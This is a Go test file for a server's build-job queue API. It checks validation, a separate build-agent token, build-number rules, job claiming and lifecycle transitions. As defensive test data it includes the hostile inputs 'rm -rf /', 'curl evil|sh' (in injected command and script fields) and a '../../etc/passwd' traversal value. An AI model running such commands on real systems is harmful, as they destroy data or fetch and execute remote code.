package api

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/Helix2010/RN-Server/internal/config"
	"github.com/gin-gonic/gin"
)

func TestClampLogTailKeepsTheEndAndBoundsTheRow(t *testing.T) {
	lines := make([]string, buildJobLogTailMax+50)
	for i := range lines {
		lines[i] = "line-" + string(rune('a'+i%26))
	}
	lines[len(lines)-1] = "the failure is always at the end"

	var kept []string
	if err := json.Unmarshal(clampLogTail(lines), &kept); err != nil {
		t.Fatal(err)
	}
	if len(kept) != buildJobLogTailMax {
		t.Fatalf("kept %d lines, want %d", len(kept), buildJobLogTailMax)
	}
	// 留头不留尾的话，这一列存的就永远是构建的开场白，而失败原因在最后
	if kept[len(kept)-1] != "the failure is always at the end" {
		t.Fatalf("the last line was dropped: %q", kept[len(kept)-1])
	}

	// 一行也不能无限长：这张表是管理端列表要扫的
	long := clampLogTail([]string{strings.Repeat("x", 9000)})
	var single []string
	if err := json.Unmarshal(long, &single); err != nil {
		t.Fatal(err)
	}
	if len(single[0]) != 2000 {
		t.Fatalf("a single line was stored at %d bytes", len(single[0]))
	}

	// nil 要落成 []，不是 JSON null——列上有 NOT NULL 语义的读法在前端
	var empty []string
	if err := json.Unmarshal(clampLogTail(nil), &empty); err != nil {
		t.Fatal(err)
	}
	if empty == nil || len(empty) != 0 {
		t.Fatalf("nil log tail became %v", empty)
	}
}

func TestIsHexRejectsWhatIsNotADigest(t *testing.T) {
	if !isHex("abc123", 6, 6) || !isHex(strings.Repeat("f", 64), 64, 64) {
		t.Fatal("valid lowercase hex was rejected")
	}
	for name, value := range map[string]string{
		"uppercase":  strings.Repeat("F", 64),
		"too short":  strings.Repeat("a", 63),
		"not hex":    strings.Repeat("z", 64),
		"empty":      "",
		"whitespace": strings.Repeat(" ", 64),
	} {
		if isHex(value, 64, 64) {
			t.Fatalf("%s was accepted as a digest", name)
		}
	}
}

func TestCreateBuildJobRejectsInvalidBodiesBeforeTouchingTheDatabase(t *testing.T) {
	gin.SetMode(gin.TestMode)
	// db 为 nil：任何走到数据库的路径都会 panic
	s := &server{cfg: config.Config{Environment: "production"}}
	for name, payload := range map[string]string{
		"not confirmed":   `{"platform":"android","gitRef":"main","version":"1.3.8","buildNumber":34,"reason":"ship signing","confirm":false}`,
		"short reason":    `{"platform":"android","gitRef":"main","version":"1.3.8","buildNumber":34,"reason":"x","confirm":true}`,
		"bad platform":    `{"platform":"windows","gitRef":"main","version":"1.3.8","buildNumber":34,"reason":"ship signing","confirm":true}`,
		"no git ref":      `{"platform":"android","gitRef":"  ","version":"1.3.8","buildNumber":34,"reason":"ship signing","confirm":true}`,
		"not semver":      `{"platform":"android","gitRef":"main","version":"1.3","buildNumber":34,"reason":"ship signing","confirm":true}`,
		"zero build":      `{"platform":"android","gitRef":"main","version":"1.3.8","buildNumber":0,"reason":"ship signing","confirm":true}`,
		"negative build":  `{"platform":"android","gitRef":"main","version":"1.3.8","buildNumber":-1,"reason":"ship signing","confirm":true}`,
		"not json":        `{`,
		"no command here": `{"platform":"android","gitRef":"main","version":"1.3.8","buildNumber":34,"reason":"ship","confirm":true,"command":"rm -rf /"}`,
	} {
		recorder := httptest.NewRecorder()
		c, _ := gin.CreateTestContext(recorder)
		c.Request = httptest.NewRequest("POST", "/v1/admin/builds", strings.NewReader(payload))
		c.Request.Header.Set("Content-Type", "application/json")
		s.createBuildJob(c)
		if recorder.Code != http.StatusBadRequest {
			t.Fatalf("%s: status %d body %s", name, recorder.Code, recorder.Body.String())
		}
	}
}

// 任务里没有命令字段。多送一个 command 过来必须被忽略而不是被执行——这是整个
// 设计的前提：服务端不在打包机上执行任意命令。
func TestBuildJobCreateCarriesNoCommandField(t *testing.T) {
	var body buildJobCreate
	if err := json.Unmarshal([]byte(`{"platform":"android","command":"rm -rf /","script":"curl evil|sh"}`), &body); err != nil {
		t.Fatal(err)
	}
	raw, err := json.Marshal(body)
	if err != nil {
		t.Fatal(err)
	}
	for _, forbidden := range []string{"command", "script", "rm -rf"} {
		if strings.Contains(string(raw), forbidden) {
			t.Fatalf("the request struct round-trips %q: %s", forbidden, raw)
		}
	}
}

func TestBuildAgentAuthIsSeparateFromTheAdminKey(t *testing.T) {
	gin.SetMode(gin.TestMode)
	s := &server{cfg: config.Config{
		Environment:     "production",
		AdminAPIKey:     "admin-key-value",
		BuildAgentToken: "agent-token-value",
	}}
	call := func(header, value string) int {
		recorder := httptest.NewRecorder()
		c, _ := gin.CreateTestContext(recorder)
		c.Request = httptest.NewRequest("POST", "/v1/build-agent/claim", nil)
		if header != "" {
			c.Request.Header.Set(header, value)
		}
		s.buildAgentAuth()(c)
		return recorder.Code
	}
	if code := call("x-build-agent-token", "agent-token-value"); code != http.StatusOK {
		t.Fatalf("the agent token was refused: %d", code)
	}
	// 一台构建机被拿下时，拿到的应该只是构建队列，不是整个管理面
	if code := call("x-admin-key", "admin-key-value"); code != http.StatusUnauthorized {
		t.Fatalf("the admin key opened the agent channel: %d", code)
	}
	if code := call("x-build-agent-token", "wrong"); code != http.StatusUnauthorized {
		t.Fatalf("a wrong token was accepted: %d", code)
	}
	if code := call("", ""); code != http.StatusUnauthorized {
		t.Fatalf("no credential was accepted: %d", code)
	}

	// 没配令牌时这条通道必须整个关着，而不是"谁都能进"
	unset := &server{cfg: config.Config{Environment: "production", AdminAPIKey: "admin-key-value"}}
	recorder := httptest.NewRecorder()
	c, _ := gin.CreateTestContext(recorder)
	c.Request = httptest.NewRequest("POST", "/v1/build-agent/claim", nil)
	c.Request.Header.Set("x-build-agent-token", "")
	unset.buildAgentAuth()(c)
	if recorder.Code != http.StatusUnauthorized {
		t.Fatalf("an unconfigured agent channel accepted a request: %d", recorder.Code)
	}
}

func TestCompleteBuildJobRejectsResultsThatAreNotDigests(t *testing.T) {
	gin.SetMode(gin.TestMode)
	s := &server{cfg: config.Config{Environment: "production"}}
	for name, payload := range map[string]string{
		"no commit":      `{"artifactSha256":"` + strings.Repeat("a", 64) + `"}`,
		"no digest":      `{"commitSha":"` + strings.Repeat("b", 40) + `"}`,
		"short digest":   `{"commitSha":"` + strings.Repeat("b", 40) + `","artifactSha256":"abc"}`,
		"path traversal": `{"commitSha":"../../etc/passwd","artifactSha256":"` + strings.Repeat("a", 64) + `"}`,
	} {
		recorder := httptest.NewRecorder()
		c, _ := gin.CreateTestContext(recorder)
		c.Params = gin.Params{{Key: "id", Value: "bld_test"}}
		c.Request = httptest.NewRequest("POST", "/v1/build-agent/jobs/bld_test/complete", strings.NewReader(payload))
		c.Request.Header.Set("Content-Type", "application/json")
		s.completeBuildJob(c)
		if recorder.Code != http.StatusBadRequest {
			t.Fatalf("%s: status %d body %s", name, recorder.Code, recorder.Body.String())
		}
	}
}

// 大小写不是拒绝的理由：git 和 sha256sum 两边都可能给出大写，统一小写入库即可。
// 这条用例存在是因为第一版把"大写"也算进了非法输入，那会让一个完全正常的构建
// 在最后一步回报失败。
func TestCompleteBuildJobNormalizesDigestCase(t *testing.T) {
	var body struct {
		CommitSHA      string `json:"commitSha"`
		ArtifactSHA256 string `json:"artifactSha256"`
	}
	raw := `{"commitSha":"` + strings.Repeat("B", 40) + `","artifactSha256":"` + strings.Repeat("A", 64) + `"}`
	if err := json.Unmarshal([]byte(raw), &body); err != nil {
		t.Fatal(err)
	}
	if !isHex(strings.ToLower(body.CommitSHA), 40, 64) || !isHex(strings.ToLower(body.ArtifactSHA256), 64, 64) {
		t.Fatal("an uppercase digest should pass once normalized")
	}
}

func TestFailBuildJobNeedsAReason(t *testing.T) {
	gin.SetMode(gin.TestMode)
	s := &server{cfg: config.Config{Environment: "production"}}
	recorder := httptest.NewRecorder()
	c, _ := gin.CreateTestContext(recorder)
	c.Params = gin.Params{{Key: "id", Value: "bld_test"}}
	c.Request = httptest.NewRequest("POST", "/v1/build-agent/jobs/bld_test/fail", strings.NewReader(`{"failureReason":"  "}`))
	c.Request.Header.Set("Content-Type", "application/json")
	s.failBuildJob(c)
	// 一条没有原因的失败等于没有记录：管理端看到 failed 却不知道为什么
	if recorder.Code != http.StatusBadRequest {
		t.Fatalf("status %d body %s", recorder.Code, recorder.Body.String())
	}
}

// ---- 需要真实 MySQL 的用例（RN_TEST_MYSQL_HOST 未设置时整组跳过）----

// seedBuildTenant 建一条租户行。认领接口是**跨租户**的（代理本来就跨租户工作），
// 所以每个用例还要把别人的排队任务清掉，否则拿到的是上一个用例留下的那条。
func seedBuildTenant(t *testing.T, s *server, tenant string) string {
	t.Helper()
	slug := "bld-" + tenant
	if _, err := s.db.Exec(`INSERT INTO tenants(id,slug,status,start_date,expiry_date,deleted,created_at,updated_at) VALUES(?,?,1,CURDATE(),DATE_ADD(CURDATE(), INTERVAL 1 YEAR),0,UTC_TIMESTAMP(3),UTC_TIMESTAMP(3))`, tenant, slug); err != nil {
		t.Fatalf("insert tenant: %v", err)
	}
	if _, err := s.db.Exec(`DELETE FROM build_jobs WHERE tenant_id<>?`, tenant); err != nil {
		t.Fatalf("clear other queues: %v", err)
	}
	return slug
}

func TestDBBuildJobQueueEnforcesMonotonicBuildNumbers(t *testing.T) {
	db := openTestDB(t)
	s := &server{db: db, cfg: config.Config{Environment: "development"}}
	tenant := testTenant(1)

	create := func(buildNumber int) *httptest.ResponseRecorder {
		c, recorder := testContext(t, tenant, "POST", "/v1/admin/builds", map[string]any{
			"platform": "android", "gitRef": "main", "version": "1.3.8",
			"buildNumber": buildNumber, "reason": "ship ota signing", "confirm": true,
		})
		s.createBuildJob(c)
		return recorder
	}

	if code := create(34).Code; code != http.StatusCreated {
		t.Fatalf("first job: %d", code)
	}
	// 同号必须被拒。两个人各排一个 build 34，装到设备上哪个赢取决于谁后装
	if recorder := create(34); recorder.Code != http.StatusConflict ||
		!strings.Contains(recorder.Body.String(), "BUILD_NUMBER_NOT_INCREASING") {
		t.Fatalf("duplicate build number: %d %s", recorder.Code, recorder.Body.String())
	}
	if recorder := create(33); recorder.Code != http.StatusConflict {
		t.Fatalf("a lower build number was accepted: %d", recorder.Code)
	}
	if code := create(35).Code; code != http.StatusCreated {
		t.Fatalf("a higher build number was refused: %d", code)
	}
}

// 构建失败 → 改一行 → 用同一个版本号重来，是最常见的那条路径。第一版把唯一键
// 直接建在 build_number 上，把它堵死了：失败的构建没有产物，那个号根本没被用掉。
func TestDBBuildJobNumberIsFreeAgainAfterAFailure(t *testing.T) {
	db := openTestDB(t)
	s := &server{db: db, cfg: config.Config{Environment: "development", BuildAgentToken: "token"}}
	tenant := testTenant(4)
	seedBuildTenant(t, s, tenant)

	queue := func(buildNumber int) *httptest.ResponseRecorder {
		c, recorder := testContext(t, tenant, "POST", "/v1/admin/builds", map[string]any{
			"platform": "android", "gitRef": "main", "version": "3.0.0",
			"buildNumber": buildNumber, "reason": "retry after failure", "confirm": true,
		})
		s.createBuildJob(c)
		return recorder
	}
	if code := queue(300).Code; code != http.StatusCreated {
		t.Fatalf("first attempt: %d", code)
	}
	claimCtx, claimRecorder := testContext(t, tenant, "POST", "/v1/build-agent/claim", map[string]any{"agent": "builder"})
	s.claimBuildJob(claimCtx)
	if claimRecorder.Code != http.StatusOK {
		t.Fatalf("claim: %d %s", claimRecorder.Code, claimRecorder.Body.String())
	}
	id := decodeBody(t, claimRecorder)["id"].(string)

	failCtx, failRecorder := testContext(t, tenant, "POST", "/v1/build-agent/jobs/"+id+"/fail", map[string]any{
		"failureReason": "gradle blew up",
	})
	failCtx.Params = gin.Params{{Key: "id", Value: id}}
	s.failBuildJob(failCtx)
	failCtx.Writer.WriteHeaderNow()
	if failRecorder.Code != http.StatusNoContent {
		t.Fatalf("fail: %d %s", failRecorder.Code, failRecorder.Body.String())
	}

	if recorder := queue(300); recorder.Code != http.StatusCreated {
		t.Fatalf("the same build number was refused after a failure: %d %s", recorder.Code, recorder.Body.String())
	}
	// 但同时排两个还是不行：唯一索引只放过 failed/canceled
	if recorder := queue(300); recorder.Code != http.StatusConflict {
		t.Fatalf("two live jobs got the same build number: %d", recorder.Code)
	}
}

func TestDBBuildJobClaimHandsEachJobToExactlyOneAgent(t *testing.T) {
	db := openTestDB(t)
	s := &server{db: db, cfg: config.Config{Environment: "development", BuildAgentToken: "token"}}
	tenant := testTenant(2)
	slug := seedBuildTenant(t, s, tenant)
	for _, buildNumber := range []int{101, 102} {
		c, recorder := testContext(t, tenant, "POST", "/v1/admin/builds", map[string]any{
			"platform": "android", "gitRef": "main", "version": "1.3.8",
			"buildNumber": buildNumber, "reason": "queue two builds", "confirm": true,
		})
		s.createBuildJob(c)
		if recorder.Code != http.StatusCreated {
			t.Fatalf("queue %d: %d %s", buildNumber, recorder.Code, recorder.Body.String())
		}
	}

	claim := func(agent string) map[string]any {
		c, recorder := testContext(t, tenant, "POST", "/v1/build-agent/claim", map[string]any{
			"agent": agent, "platforms": []string{"android"},
		})
		s.claimBuildJob(c)
		if recorder.Code != http.StatusOK {
			t.Fatalf("claim by %s: %d %s", agent, recorder.Code, recorder.Body.String())
		}
		return decodeBody(t, recorder)
	}
	first := claim("builder-a")
	second := claim("builder-b")
	if first["id"] == second["id"] {
		t.Fatalf("two agents claimed the same job: %v", first["id"])
	}
	// 先排队的先出去：build 101 在 102 之前
	if first["buildNumber"].(float64) != 101 {
		t.Fatalf("the queue is not FIFO: %v", first["buildNumber"])
	}
	if first["status"] != "claimed" || first["claimedBy"] != "builder-a" {
		t.Fatalf("claim did not stick: %v", first)
	}
	// 证书随任务下发，私钥不下发
	if _, present := first["otaCertificatePem"]; !present {
		t.Fatal("the claim response must carry the tenant OTA certificate")
	}
	for key, value := range first {
		if text, ok := value.(string); ok && strings.Contains(text, "PRIVATE KEY") {
			t.Fatalf("the claim response leaked a private key in %s", key)
		}
	}
	if first["tenantSlug"] != slug {
		t.Fatalf("the agent cannot tell which tenant to build: %v", first["tenantSlug"])
	}
}

func TestDBBuildJobLifecycleRefusesOutOfOrderTransitions(t *testing.T) {
	db := openTestDB(t)
	s := &server{db: db, cfg: config.Config{Environment: "development", BuildAgentToken: "token"}}
	tenant := testTenant(3)
	seedBuildTenant(t, s, tenant)
	c, recorder := testContext(t, tenant, "POST", "/v1/admin/builds", map[string]any{
		"platform": "android", "gitRef": "main", "version": "2.0.0",
		"buildNumber": 200, "reason": "lifecycle test", "confirm": true,
	})
	s.createBuildJob(c)
	if recorder.Code != http.StatusCreated {
		t.Fatalf("queue: %d %s", recorder.Code, recorder.Body.String())
	}
	id := decodeBody(t, recorder)["id"].(string)

	finish := func(jobID string) int {
		c, recorder := testContext(t, tenant, "POST", "/v1/build-agent/jobs/"+jobID+"/complete", map[string]any{
			"commitSha": strings.Repeat("a", 40), "artifactSha256": strings.Repeat("b", 64),
		})
		c.Params = gin.Params{{Key: "id", Value: jobID}}
		s.completeBuildJob(c)
		// 204 没有 body，gin 的 writer 会一直等到第一次写才发 header
		c.Writer.WriteHeaderNow()
		return recorder.Code
	}
	// 还没被认领就回报成功：说明有人在乱发请求，不能悄悄接受
	if code := finish(id); code != http.StatusConflict {
		t.Fatalf("a queued job accepted a result: %d", code)
	}

	claimCtx, claimRecorder := testContext(t, tenant, "POST", "/v1/build-agent/claim", map[string]any{"agent": "builder"})
	s.claimBuildJob(claimCtx)
	if claimRecorder.Code != http.StatusOK {
		t.Fatalf("claim: %d %s", claimRecorder.Code, claimRecorder.Body.String())
	}
	claimed := decodeBody(t, claimRecorder)["id"].(string)
	if code := finish(claimed); code != http.StatusNoContent {
		t.Fatalf("a claimed job refused its result: %d", code)
	}
	// 成功之后不能再被改成别的状态
	if code := finish(claimed); code != http.StatusConflict {
		t.Fatalf("a finished job accepted a second result: %d", code)
	}

	cancelCtx, cancelRecorder := testContext(t, tenant, "POST", "/v1/admin/builds/"+claimed+"/cancel", map[string]any{
		"reason": "too late", "confirm": true,
	})
	cancelCtx.Params = gin.Params{{Key: "id", Value: claimed}}
	s.cancelBuildJob(cancelCtx)
	// 取消一个已经出了包的构建只会让状态骗人：包已经在那里了
	if cancelRecorder.Code != http.StatusConflict {
		t.Fatalf("a succeeded job was canceled: %d", cancelRecorder.Code)
	}
}

// 发布记录由代理创建，而记录建好之后没有改说明的接口——2026-09-11 的 1.3.9 就是
// 带着空说明发给用户的。说明必须在排队时跟着任务走，而且用与人工发布同一套校验。
func TestBuildJobCarriesReleaseNotesAndValidatesThemLikeAManualRelease(t *testing.T) {
	gin.SetMode(gin.TestMode)
	s := &server{cfg: config.Config{Environment: "production"}}
	for name, payload := range map[string]string{
		"notes are not arrays": `{"platform":"android","gitRef":"main","version":"1.3.10","buildNumber":39,"reason":"ship","confirm":true,"releaseNotes":{"zh-CN":"一行"}}`,
		"empty language key":   `{"platform":"android","gitRef":"main","version":"1.3.10","buildNumber":39,"reason":"ship","confirm":true,"releaseNotes":{"  ":["x"]}}`,
		"line is not a string": `{"platform":"android","gitRef":"main","version":"1.3.10","buildNumber":39,"reason":"ship","confirm":true,"releaseNotes":{"zh-CN":[1]}}`,
	} {
		recorder := httptest.NewRecorder()
		c, _ := gin.CreateTestContext(recorder)
		c.Request = httptest.NewRequest("POST", "/v1/admin/builds", strings.NewReader(payload))
		c.Request.Header.Set("Content-Type", "application/json")
		s.createBuildJob(c)
		// db 为 nil：能走到数据库就会 panic，所以这里必须在校验阶段就被拒
		if recorder.Code != http.StatusUnprocessableEntity {
			t.Fatalf("%s: status %d body %s", name, recorder.Code, recorder.Body.String())
		}
	}

	// 空说明读回来是空对象而不是 null：前端按对象渲染，null 会多一处判空
	if notes := buildJobReleaseNotes(buildJob{}); notes == nil || len(notes) != 0 {
		t.Fatalf("an empty release note column became %v", notes)
	}
	stored := buildJob{ReleaseNotes: []byte(`{"zh-CN":["修了两个崩溃"]}`)}
	if got := buildJobReleaseNotes(stored)["zh-CN"]; len(got) != 1 || got[0] != "修了两个崩溃" {
		t.Fatalf("stored notes did not round trip: %v", got)
	}
}
